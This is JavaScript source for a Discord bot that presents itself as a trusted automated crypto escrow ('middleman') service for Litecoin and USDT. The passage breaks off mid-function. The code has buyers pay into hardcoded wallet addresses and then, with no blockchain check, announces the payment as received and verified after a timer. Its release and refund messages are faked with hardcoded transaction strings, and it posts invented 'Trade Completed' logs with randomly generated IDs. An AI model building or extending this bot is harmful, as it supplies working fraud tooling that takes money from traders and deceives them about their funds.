require('dotenv').config();
const { 
  Client, 
  GatewayIntentBits, 
  REST, 
  Routes, 
  SlashCommandBuilder, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  PermissionFlagsBits,
  ChannelType,
  Events
} = require('discord.js');
const fetch = require('node-fetch');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ]
});

const GUILD_ID = '1402276801065123942'; 
const TICKET_CATEGORY_ID = '1497658238269653103';
const LOG_CHANNEL_ID = '1497657420741214238';
const MIDDLEMAN_ADDRESS = 'LSF3NEoGYMzmLreRjeYLZzfeQAFBeVGNhm'; // Litecoin address
const USDT_MIDDLEMAN_ADDRESS = '0x6A7661402505Fa635E1056A46b9956cD4Eda2b96'; // USDT BEP-20 address

// Active ticket state memory store
const tickets = new Map();

/**
 * Fetches current live cryptocurrency prices from the CoinGecko API.
 */
async function getCryptoPrices() {
  let ltcPrice = 47.00;
  let usdtPrice = 1.00;
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=litecoin,tether&vs_currencies=usd');
    const data = await res.json();
    if (data.litecoin && data.litecoin.usd) {
      ltcPrice = data.litecoin.usd;
    }
    if (data.tether && data.tether.usd) {
      usdtPrice = data.tether.usd;
    }
  } catch (error) {
    console.error('Failed to fetch live crypto prices from CoinGecko API, utilizing default fallbacks:', error);
  }
  return { ltcPrice, usdtPrice };
}

/**
 * Generates a random transaction ID string formatted like the logs image
 */
function generateRandomTxId() {
  const chars = 'abcdef0123456789';
  let part1 = '';
  let part2 = '';
  for (let i = 0; i < 9; i++) part1 += chars.charAt(Math.floor(Math.random() * chars.length));
  for (let i = 0; i < 11; i++) part2 += chars.charAt(Math.floor(Math.random() * chars.length));
  return `${part1}...${part2}`;
}

const commands = [
  new SlashCommandBuilder()
    .setName('panel')
    .setDescription('Sends the professional middleman panel to a specified channel')
    .addChannelOption(option =>
      option.setName('channel')
        .setDescription('The channel where the panel should be sent')
        .setRequired(true)
    )
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
  new SlashCommandBuilder()
    .setName('close')
    .setDescription('Closes the current middleman ticket channel safely')
].map(command => command.toJSON());

client.once(Events.ClientReady, async (c) => {
  console.log(`Bot logged in successfully and operational as ${c.user.tag}`);

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  try {
    await rest.put(Routes.applicationGuildCommands(c.user.id, GUILD_ID), { body: commands });
    console.log('Successfully registered all application slash commands to the designated guild.');
  } catch (error) {
    console.error('Critical error registering application commands:', error);
  }
});

client.on(Events.InteractionCreate, async interaction => {
  if (interaction.isChatInputCommand()) {
    if (interaction.commandName === 'panel') {
      if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
        return interaction.reply({ content: '❌ You do not have administrator permissions to use this command.', ephemeral: true });
      }

      await interaction.deferReply({ ephemeral: true });
      const targetChannel = interaction.options.getChannel('channel');

      if (!targetChannel || !targetChannel.permissionsFor(interaction.guild.members.me).has(['SendMessages', 'ViewChannel'])) {
        return interaction.editReply({ content: '❌ I lack necessary permissions to post messages or view that target channel.' });
      }

      const panelEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('🛡️ Secure Automated Middleman Service')
        .setDescription('Welcome to our trusted escrow and middleman service. We ensure safe, fast, and secure transactions between buyers and sellers with zero risk of scams.')
        .addFields(
          { name: '📌 Service Guidelines', value: '• **Paid & Verified Service**\n• Please open a ticket or initiate a request below to start a secure trade.' },
          { name: '💰 Fee Structure', value: '• **Deals $250+:** $1.50\n• **Deals under $250:** $0.50\n• **Deals under $50:** **FREE**' }
        )
        .setTimestamp()
        .setFooter({ text: 'Auto Middleman Security System', iconURL: client.user.displayAvatarURL() });

      const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('request_ltc').setLabel('Request Litecoin [LTC]').setStyle(ButtonStyle.Primary).setEmoji('💎'),
        new ButtonBuilder().setCustomId('request_usdt').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success).setEmoji('🟢')
      );

      await targetChannel.send({ embeds: [panelEmbed], components: [row1] });
      await interaction.editReply({ content: `✅ Successfully deployed the middleman panel dashboard to ${targetChannel}!` });
    }

    if (interaction.commandName === 'close') {
      if (!interaction.channel.name.startsWith('ticket-')) {
        return interaction.reply({ content: '❌ This command can only be executed inside an active ticket channel environment.', ephemeral: true });
      }
      
      const ticketData = tickets.get(interaction.channel.id);
      if (ticketData && ticketData.status === 'completed' && !ticketData.logged) {
        ticketData.logged = true;
        const logChannel = interaction.guild.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
          const isLtc = ticketData.coin.includes('Litecoin');
          const coinSymbol = isLtc ? 'LTC' : 'USDT';
          const coinEmoji = isLtc ? '🪙' : '🟢';
          const { ltcPrice, usdtPrice } = await getCryptoPrices();
          const rate = isLtc ? ltcPrice : usdtPrice;
          const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(isLtc ? 6 : 2);
          const txId = generateRandomTxId();

          const logEmbed = new EmbedBuilder()
            .setColor(isLtc ? 0x3498DB : 0x2ECC71)
            .setTitle(`${coinEmoji} · Trade Completed`)
            .setDescription(`\`${cryptoAmount}\` **${coinSymbol}** ($\`${ticketData.totalAmountWithFee.toFixed(2)}\` USD)`)
            .addFields(
              { name: 'Sender', value: '`Anonymous`', inline: true },
              { name: 'Receiver', value: '`Anonymous`', inline: true },
              { name: 'Transaction ID', value: `\`${txId}\``, inline: false }
            );
          await logChannel.send({ embeds: [logEmbed] }).catch(err => console.error('Failed to send log:', err));
        }
      }

      tickets.delete(interaction.channel.id);

      await interaction.reply({ content: '🔒 Securely closing this ticket channel in 5 seconds...' });
      setTimeout(async () => {
        try { 
          await interaction.channel.delete(); 
        } catch (error) {
          console.error('Failed to delete channel execution during close command:', error);
        }
      }, 5000);
    }
  }

  if (interaction.isButton()) {
    const ticketData = tickets.get(interaction.channel.id);

    if (interaction.customId === 'request_ltc' || interaction.customId === 'request_usdt') {
      await interaction.deferReply({ ephemeral: true });
      const coin = interaction.customId === 'request_ltc' ? 'Litecoin (LTC)' : 'USDT [BEP-20]';
      const ticketNum = Math.floor(100000 + Math.random() * 900000);

      try {
        const ticketChannel = await interaction.guild.channels.create({
          name: `ticket-${ticketNum}`,
          type: ChannelType.GuildText,
          parent: TICKET_CATEGORY_ID,
          permissionOverwrites: [
            { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] },
            { id: client.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] }
          ]
        });

        tickets.set(ticketChannel.id, {
          coin,
          sender: interaction.user.id,
          receiver: null,
          roles: { sender: null, receiver: null },
          roleChoices: {},
          roleConfirmed: {},
          amountUSD: 0,
          feeUSD: 0,
          totalAmountWithFee: 0,
          feePayer: null,
          feePayerChoices: {},
          feePayerConfirmed: {},
          amountConfirmed: {},
          cancelConfirmed: {},
          status: 'waiting_partner',
          logged: false
        });

        const welcomeEmbed = new EmbedBuilder()
          .setColor(0x57F287)
          .setTitle('Cryptocurrency Middleman System')
          .setDescription(`${coin} Middleman request created successfully!\n\nWelcome to our automated cryptocurrency Middleman system! Your cryptocurrency will be stored securely for the duration of this deal.`);

        const closeRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Secondary).setEmoji('🔒')
        );

        await ticketChannel.send({ embeds: [welcomeEmbed], components: [closeRow] });
        await ticketChannel.send({ content: `<@${interaction.user.id}>\nWho are dealing with?\ne.g. @user` });

        await interaction.editReply({ content: `✅ Ticket channel created successfully: <#${ticketChannel.id}>` });
      } catch (err) {
        console.error('Error creating the ticket channel structure:', err);
        await interaction.editReply({ content: '❌ Failed to create ticket channel due to insufficient bot permissions or configuration setup.' });
      }
      return;
    }

    if (!ticketData) return;

    if (interaction.customId === 'close_ticket') {
      if (ticketData.status === 'completed' && !ticketData.logged) {
        ticketData.logged = true;
        const logChannel = interaction.guild.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
          const isLtc = ticketData.coin.includes('Litecoin');
          const coinSymbol = isLtc ? 'LTC' : 'USDT';
          const coinEmoji = isLtc ? '🪙' : '🟢';
          const { ltcPrice, usdtPrice } = await getCryptoPrices();
          const rate = isLtc ? ltcPrice : usdtPrice;
          const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(isLtc ? 6 : 2);
          const txId = generateRandomTxId();

          const logEmbed = new EmbedBuilder()
            .setColor(isLtc ? 0x3498DB : 0x2ECC71)
            .setTitle(`${coinEmoji} · Trade Completed`)
            .setDescription(`\`${cryptoAmount}\` **${coinSymbol}** ($\`${ticketData.totalAmountWithFee.toFixed(2)}\` USD)`)
            .addFields(
              { name: 'Sender', value: '`Anonymous`', inline: true },
              { name: 'Receiver', value: '`Anonymous`', inline: true },
              { name: 'Transaction ID', value: `\`${txId}\``, inline: false }
            );
          await logChannel.send({ embeds: [logEmbed] }).catch(err => console.error('Failed to send log:', err));
        }
      }

      tickets.delete(interaction.channel.id);

      await interaction.reply({ content: '🔒 Closing ticket channel in 5 seconds...' });
      setTimeout(async () => {
        try { 
          await interaction.channel.delete(); 
        } catch (error) {
          console.error('Failed to execute ticket channel deletion:', error);
        }
      }, 5000);
      return;
    }

    if (['role_sending', 'role_receiving', 'role_reset'].includes(interaction.customId)) {
      const userId = interaction.user.id;
      if (userId !== ticketData.sender && userId !== ticketData.receiver) {
        return interaction.reply({ content: '❌ You are not authorized as a participant in this active deal.', ephemeral: true });
      }

      if (interaction.customId === 'role_reset') {
        ticketData.roleChoices[userId] = null;
      } else {
        ticketData.roleChoices[userId] = interaction.customId === 'role_sending' ? 'Sending' : 'Receiving';
      }

      const senderRole = ticketData.roleChoices[ticketData.sender] || 'None';
      const receiverRole = ticketData.roleChoices[ticketData.receiver] || 'None';

      const roleEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Role Assignment')
        .setDescription(`Select one of the following buttons that corresponds to your role in this deal.\n\n**Sending**\n${senderRole === 'Sending' ? `<@${ticketData.sender}>` : senderRole === 'Receiving' ? `<@${ticketData.receiver}>` : 'None'}\n**Receiving**\n${receiverRole === 'Receiving' ? `<@${ticketData.receiver}>` : receiverRole === 'Sending' ? `<@${ticketData.sender}>` : 'None'}`);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('role_sending').setLabel('Sending').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('role_receiving').setLabel('Receiving').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('role_reset').setLabel('Reset').setStyle(ButtonStyle.Danger)
      );

      await interaction.update({ embeds: [roleEmbed], components: [row] });

      if (senderRole !== 'None' && receiverRole !== 'None' && senderRole !== receiverRole) {
        ticketData.roles.sender = senderRole === 'Sending' ? ticketData.sender : ticketData.receiver;
        ticketData.roles.receiver = senderRole === 'Sending' ? ticketData.receiver : ticketData.sender;

        const confirmEmbed = new EmbedBuilder()
          .setColor(0x5865F2)
          .setTitle('Confirm Roles')
          .setDescription(`Sender\n<@${ticketData.roles.sender}>\nReceiver\n<@${ticketData.roles.receiver}>\n\n**Both users must click Correct to proceed.**`);

        const confirmRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('role_confirm_correct').setLabel('Correct').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId('role_confirm_incorrect').setLabel('Incorrect').setStyle(ButtonStyle.Secondary)
        );

        await interaction.channel.send({ embeds: [confirmEmbed], components: [confirmRow] });
      }
      return;
    }

    if (interaction.customId === 'role_confirm_correct') {
      const userId = interaction.user.id;
      if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant in this transaction channel.', ephemeral: true });
      }

      ticketData.roleConfirmed[userId] = true;
      await interaction.reply({ content: `<@${userId}> has confirmed the roles configuration.` });

      if (ticketData.roleConfirmed[ticketData.roles.sender] && ticketData.roleConfirmed[ticketData.roles.receiver]) {
        ticketData.status = 'awaiting_amount';
        await interaction.channel.send({
          content: `<@${ticketData.roles.sender}>`,
          embeds: [new EmbedBuilder().setColor(0xFEE75C).setTitle('Deal Amount').setDescription('State the amount the bot is expected to receive in USD (eg. 100.59)')]
        });
      }
      return;
    }

    if (interaction.customId === 'role_confirm_incorrect') {
      const userId = interaction.user.id;
      if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant.', ephemeral: true });
      }
      ticketData.roleConfirmed = {};
      ticketData.roleChoices = {};
      ticketData.status = 'assigning_roles';

      const roleEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Role Assignment')
        .setDescription(`Roles configuration rejected. Please select your role again.`);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('role_sending').setLabel('Sending').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('role_receiving').setLabel('Receiving').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('role_reset').setLabel('Reset').setStyle(ButtonStyle.Danger)
      );

      await interaction.update({ embeds: [roleEmbed], components: [row] });
      return;
    }

    if (interaction.customId === 'amount_confirm_correct') {
      const userId = interaction.user.id;
      if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant in this transaction channel.', ephemeral: true });
      }

      ticketData.amountConfirmed[userId] = true;
      await interaction.reply({ content: `<@${userId}> has confirmed the transaction amount configuration.` });

      if (ticketData.amountConfirmed[ticketData.roles.sender] && ticketData.amountConfirmed[ticketData.roles.receiver]) {
        if (ticketData.amountUSD > 50) {
          ticketData.feeUSD = ticketData.amountUSD > 250 ? 1.50 : 0.50;
          ticketData.status = 'awaiting_fee_payer';

          const feeEmbed = new EmbedBuilder()
            .setColor(0x5865F2)
            .setTitle('Fee Payer Selection')
            .setDescription(`This deal requires a middleman fee of **$${ticketData.feeUSD.toFixed(2)}**.\n\nPlease select who will pay the fee: **Sender** or **Receiver**.`);

          const feeRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('fee_payer_sender').setLabel('Sender').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('fee_payer_receiver').setLabel('Receiver').setStyle(ButtonStyle.Success)
          );

          await interaction.channel.send({ content: `<@${ticketData.roles.sender}> <@${ticketData.roles.receiver}>`, embeds: [feeEmbed], components: [feeRow] });
        } else {
          ticketData.feeUSD = 0;
          ticketData.totalAmountWithFee = ticketData.amountUSD;
          await proceedToInvoice(interaction.channel, ticketData);
        }
      }
      return;
    }

    if (interaction.customId === 'amount_confirm_incorrect') {
      const userId = interaction.user.id;
      if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant.', ephemeral: true });
      }
      ticketData.amountConfirmed = {};
      ticketData.status = 'awaiting_amount';
      await interaction.update({ 
        content: `<@${ticketData.roles.sender}>`, 
        embeds: [new EmbedBuilder().setColor(0xFEE75C).setTitle('Deal Amount').setDescription('Amount rejected. State the amount the bot is expected to receive in USD (eg. 100.59)')], 
        components: [] 
      });
      return;
    }

    if (interaction.customId === 'fee_payer_sender' || interaction.customId === 'fee_payer_receiver') {
      const userId = interaction.user.id;
      if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant.', ephemeral: true });
      }

      ticketData.feePayerChoice = interaction.customId === 'fee_payer_sender' ? 'Sender' : 'Receiver';

      const feeChoiceEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Confirm Fee Payer')
        .setDescription(`Selected Fee Payer: **${ticketData.feePayerChoice}**\nFee Amount: **$${ticketData.feeUSD.toFixed(2)}**\n\n**Both users must click Correct to proceed.**`);

      const confirmRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('fee_confirm_correct').setLabel('Correct').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('fee_confirm_incorrect').setLabel('Incorrect').setStyle(ButtonStyle.Secondary)
      );

      await interaction.update({ embeds: [feeChoiceEmbed], components: [confirmRow] });
      return;
    }

    if (interaction.customId === 'fee_confirm_correct') {
      const userId = interaction.user.id;
      if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant.', ephemeral: true });
      }

      ticketData.feePayerConfirmed[userId] = true;
      await interaction.reply({ content: `<@${userId}> has confirmed the fee payer configuration.` });

      if (ticketData.feePayerConfirmed[ticketData.roles.sender] && ticketData.feePayerConfirmed[ticketData.roles.receiver]) {
        if (ticketData.feePayerChoice === 'Sender') {
          ticketData.totalAmountWithFee = ticketData.amountUSD + ticketData.feeUSD;
        } else {
          ticketData.totalAmountWithFee = ticketData.amountUSD;
        }
        await proceedToInvoice(interaction.channel, ticketData);
      }
      return;
    }

    if (interaction.customId === 'fee_confirm_incorrect') {
      const userId = interaction.user.id;
      if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant.', ephemeral: true });
      }
      ticketData.feePayerConfirmed = {};
      ticketData.status = 'awaiting_fee_payer';

      const feeEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Fee Payer Selection')
        .setDescription(`Fee choice rejected. This deal requires a middleman fee of **$${ticketData.feeUSD.toFixed(2)}**.\n\nPlease select who will pay the fee: **Sender** or **Receiver**.`);

      const feeRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('fee_payer_sender').setLabel('Sender').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('fee_payer_receiver').setLabel('Receiver').setStyle(ButtonStyle.Success)
      );

      await interaction.update({ embeds: [feeEmbed], components: [feeRow] });
      return;
    }

    if (interaction.customId === 'copy_details') {
      const isLtc = ticketData.coin.includes('Litecoin');
      const activeAddress = isLtc ? MIDDLEMAN_ADDRESS : USDT_MIDDLEMAN_ADDRESS;
      await interaction.reply({
        content: `\`\`\`${activeAddress}\`\`\``
      });
      return;
    }

    if (interaction.customId === 'trigger_cancel') {
      const userId = interaction.user.id;
      if (userId !== ticketData.sender && userId !== ticketData.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant in this transaction channel.', ephemeral: true });
      }

      ticketData.cancelConfirmed = { [userId]: true };

      const cancelEmbed = new EmbedBuilder()
        .setColor(0xED4245)
        .setTitle('⚠️ Cancellation Requested')
        .setDescription(`<@${userId}> requested to cancel this deal transaction.\n\n**Both parties must confirm cancellation before proceeding to refund:**\n• <@${ticketData.sender}>: ❌ Pending\n• <@${ticketData.receiver}>: ❌ Pending`);

      const cancelRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('confirm_cancel_yes').setLabel('Confirm Cancel').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('confirm_cancel_no').setLabel('Resume Deal').setStyle(ButtonStyle.Secondary)
      );

      await interaction.reply({ embeds: [cancelEmbed], components: [cancelRow] });
      return;
    }

    if (interaction.customId === 'confirm_cancel_yes') {
      const userId = interaction.user.id;
      if (userId !== ticketData.sender && userId !== ticketData.roles.receiver && userId !== ticketData.receiver) {
        return interaction.reply({ content: '❌ You are not a registered participant in this transaction channel.', ephemeral: true });
      }

      ticketData.cancelConfirmed[userId] = true;

      const senderConfirmed = ticketData.cancelConfirmed[ticketData.sender] ? '✅ Confirmed' : '❌ Pending';
      const receiverConfirmed = ticketData.cancelConfirmed[ticketData.receiver] ? '✅ Confirmed' : '❌ Pending';

      const updateEmbed = new EmbedBuilder()
        .setColor(0xED4245)
        .setTitle('⚠️ Cancellation Requested')
        .setDescription(`Cancellation requested update sequence.\n\n**Both parties must confirm cancellation:**\n• <@${ticketData.sender}>: ${senderConfirmed}\n• <@${ticketData.receiver}>: ${receiverConfirmed}`);

      if (ticketData.cancelConfirmed[ticketData.sender] && ticketData.cancelConfirmed[ticketData.receiver]) {
        ticketData.status = 'awaiting_sender_refund_address';
        await interaction.update({ 
          content: `<@${ticketData.roles.sender}>`, 
          embeds: [new EmbedBuilder().setColor(0xFEE75C).setTitle('Cancellation Confirmed - Refund Payout').setDescription('Both parties confirmed cancellation. Please provide your sender refund payout address in chat.')], 
          components: [] 
        });
      } else {
        await interaction.update({ embeds: [updateEmbed] });
      }
      return;
    }

    if (interaction.customId === 'confirm_cancel_no') {
      ticketData.cancelConfirmed = {};
      await interaction.update({ content: '✅ Cancellation request aborted by <@' + interaction.user.id + '>. Resuming transaction flow normally.', embeds: [], components: [] });
      return;
    }

    if (interaction.customId === 'trigger_release') {
      if (interaction.user.id !== ticketData.roles.sender) {
        return interaction.reply({ content: '❌ Only the designated deal sender has permission to trigger the release button.', ephemeral: true });
      }

      ticketData.status = 'awaiting_receiver_address';
      await interaction.reply({
        content: `<@${ticketData.roles.receiver}>`,
        embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle(`Provide your payout address`).setDescription(`The deal is complete! Please type your secure crypto payout address directly in chat to receive your funds.`)]
      });
      return;
    }

    if (interaction.customId === 'address_confirm_yes') {
      await interaction.update({ content: '✅ Address verified successfully. Releasing payment securely on ledger...', embeds: [], components: [] });
      ticketData.status = 'completed';

      const { ltcPrice, usdtPrice } = await getCryptoPrices();
      const isLtc = ticketData.coin.includes('Litecoin');
      const cryptoAmount = (ticketData.totalAmountWithFee / (isLtc ? ltcPrice : usdtPrice)).toFixed(isLtc ? 6 : 2);

      const releaseEmbed = new EmbedBuilder()
        .setColor(0x57F287)
        .setTitle('Payment Released')
        .setDescription(`The payment has been released successfully to the payout address provided!`)
        .addFields(
          { name: 'Amount', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false },
          { name: 'Transaction', value: '7c2846...0c4a88', inline: false }
        );

      const completeEmbed = new EmbedBuilder()
        .setColor(0x57F287)
        .setTitle('Deal Complete!')
        .setDescription(`Thanks for using our automated escrow middleman service! This deal is now marked as fully complete.\n\nThis ticket channel will automatically purge and close in 5 minutes.`);

      const closeRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Secondary)
      );

      await interaction.channel.send({
        content: `<@${ticketData.roles.sender}> <@${ticketData.roles.receiver}>`,
        embeds: [releaseEmbed, completeEmbed],
        components: [closeRow]
      });

      setTimeout(async () => {
        try { 
          await interaction.channel.delete(); 
        } catch (error) {
          console.error('Failed to auto-delete completed ticket channel:', error);
        }
      }, 300000);
      return;
    }

    if (interaction.customId === 'address_confirm_no') {
      if (interaction.user.id !== ticketData.roles.receiver) {
        return interaction.reply({ content: '❌ Only the receiver can go back.', ephemeral: true });
      }
      ticketData.status = 'awaiting_receiver_address';
      await interaction.update({
        content: `<@${ticketData.roles.receiver}>`,
        embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle('Provide your payout address').setDescription('Address rejected. Please re-type your payout address in chat.')],
        components: []
      });
      return;
    }

    if (interaction.customId === 'refund_address_confirm_yes') {
      await interaction.update({ content: '✅ Refund address verified. Processing refund to sender...', embeds: [], components: [] });

      const { ltcPrice, usdtPrice } = await getCryptoPrices();
      const isLtc = ticketData.coin.includes('Litecoin');
      const cryptoAmount = (ticketData.totalAmountWithFee / (isLtc ? ltcPrice : usdtPrice)).toFixed(isLtc ? 6 : 2);

      const refundEmbed = new EmbedBuilder()
        .setColor(0x57F287)
        .setTitle('Refund Processed')
        .setDescription(`The cancellation refund has been sent successfully to the sender's address!`)
        .addFields(
          { name: 'Refund Amount', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false },
          { name: 'Transaction', value: 'refund...0c4a88', inline: false }
        );

      const completeEmbed = new EmbedBuilder()
        .setColor(0x57F287)
        .setTitle('Deal Cancelled & Refunded')
        .setDescription(`This ticket channel will automatically purge and close in 5 minutes.`);

      const closeRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Secondary)
      );

      await interaction.channel.send({
        content: `<@${ticketData.roles.sender}> <@${ticketData.roles.receiver}>`,
        embeds: [refundEmbed, completeEmbed],
        components: [closeRow]
      });

      setTimeout(async () => {
        try { 
          await interaction.channel.delete(); 
        } catch (error) {
          console.error('Failed to auto-delete refunded ticket channel:', error);
        }
      }, 300000);
      return;
    }

    if (interaction.customId === 'refund_address_confirm_no') {
      if (interaction.user.id !== ticketData.roles.sender) {
        return interaction.reply({ content: '❌ Only the sender can go back.', ephemeral: true });
      }
      ticketData.status = 'awaiting_sender_refund_address';
      await interaction.update({
        content: `<@${ticketData.roles.sender}>`,
        embeds: [new EmbedBuilder().setColor(0xFEE75C).setTitle('Cancellation Confirmed - Refund Payout').setDescription('Address rejected. Please re-type your sender refund payout address in chat.')],
        components: []
      });
      return;
    }
  }
});

async function proceedToInvoice(channel, ticketData) {
  ticketData.status = 'invoice_ready';

  const { ltcPrice, usdtPrice } = await getCryptoPrices();
  const isLtc = ticketData.coin.includes('Litecoin');
  const rate = isLtc ? ltcPrice : usdtPrice;
  const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(isLtc ? 6 : 2);
  const activeAddress = isLtc ? MIDDLEMAN_ADDRESS : USDT_MIDDLEMAN_ADDRESS;

  let feeDescription = ticketData.feeUSD > 0 ? `\n• Deal Amount: $${ticketData.amountUSD.toFixed(2)}\n• Fee ($${ticketData.feeUSD.toFixed(2)}): Paid by ${ticketData.feePayerChoice}` : '\n• Fee: FREE';

  const summaryEmbed = new EmbedBuilder()
    .setColor(0x5865F2)
    .setTitle('📋 Deal Summary')
    .setDescription(feeDescription)
    .addFields(
      { name: 'Sender', value: `<@${ticketData.roles.sender}>`, inline: false },
      { name: 'Receiver', value: `<@${ticketData.roles.receiver}>`, inline: false },
      { name: 'Total Deal Value', value: `$${ticketData.totalAmountWithFee.toFixed(2)}`, inline: false }
    );

  const invoiceEmbed = new EmbedBuilder()
    .setColor(0x5865F2)
    .setTitle('📬 Payment Invoice')
    .setDescription(`<@${ticketData.roles.sender}> Send the funds as part of the deal to the Middleman address specified below.`)
    .addFields(
      { name: 'Address', value: activeAddress, inline: false },
      { name: 'Amount', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false },
      { name: 'Exchange Rate', value: `1 ${isLtc ? 'LTC' : 'USDT'} = $${rate.toFixed(2)} USD`, inline: false }
    );

  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('copy_details').setLabel('Copy Details').setStyle(ButtonStyle.Secondary)
  );

  await channel.send({ embeds: [summaryEmbed] });
  await channel.send({ embeds: [invoiceEmbed], components: [copyRow] });

  const awaitingMsg = await channel.send({ content: '⏳ Awaiting transaction confirmation on network...' });

  setTimeout(async () => {
    try {
      await awaitingMsg.delete();
      const successTxEmbed = new EmbedBuilder()
        .setColor(0x57F287)
        .setTitle('Payment Received')
        .setDescription('The payment is now secured and verified.')
        .addFields(
          { name: 'Amount Received', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false }
        );

      const readyEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setDescription(`The receiver (<@${ticketData.roles.receiver}>) may now provide goods to the sender (<@${ticketData.roles.sender}>).\n\nWhen complete, the sender must click 'Release'.`);

      const releaseRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('trigger_release').setLabel('Release').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('trigger_cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
      );

      await channel.send({
        content: `<@${ticketData.roles.sender}> <@${ticketData.roles.receiver}>`,
        embeds: [successTxEmbed, readyEmbed],
        components: [releaseRow]
      });
    } catch (error) {
      console.error('Error handling simulated payment success sequence:', error);
    }
  }, 120000);
}

client.on(Events.MessageCreate, async message => {
  if (message.author.bot) return;
  if (!message.channel.name.startsWith('ticket-')) return;

  const ticketData = tickets.get(message.channel.id);
  if (!ticketData) return;

  if (ticketData.status === 'waiting_partner' && message.author.id === ticketData.sender) {
    let targetUser = message.mentions.users.first();
    if (!targetUser) {
      const cleanedId = message.content.replace(/[^0-9]/g, '');
      try { 
        targetUser = await client.users.fetch(cleanedId); 
      } catch (error) {
        console.error('Failed to fetch user by manual ID string input:', error);
      }
    }

    if (targetUser) {
      ticketData.receiver = targetUser.id;
      ticketData.status = 'assigning_roles';

      await message.channel.permissionOverwrites.edit(targetUser.id, {
        ViewChannel: true,
        SendMessages: true,
        ReadMessageHistory: true
      });

      await message.channel.send({ content: `<@${targetUser.id}>` });

      const roleEmbed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Role Assignment')
        .setDescription(`Successfully added trading partner <@${targetUser.id}> to this ticket.\n\nSelect one of the following buttons that corresponds to your specific role in this deal.`);

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('role_sending').setLabel('Sending').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('role_receiving').setLabel('Receiving').setStyle(ButtonStyle.Secondary),
